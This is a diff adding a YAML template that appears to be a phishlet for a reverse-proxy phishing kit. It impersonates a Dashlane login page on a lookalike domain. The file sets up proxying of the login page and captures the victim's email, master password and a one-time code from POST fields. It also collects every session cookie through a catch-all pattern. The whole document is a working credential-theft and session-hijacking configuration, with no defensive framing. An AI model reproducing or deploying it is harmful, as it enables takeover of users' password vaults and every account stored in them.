@@ -1,0 +1,26 @@
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'negro-dashlane.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'negro-dashlane.com', orig_sub: '', domain: 'negro-dashlane.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'negro-dashlane.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/3post.php'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'masterPassword'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'code'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'negro-dashlane.com'
+  path: '/login'
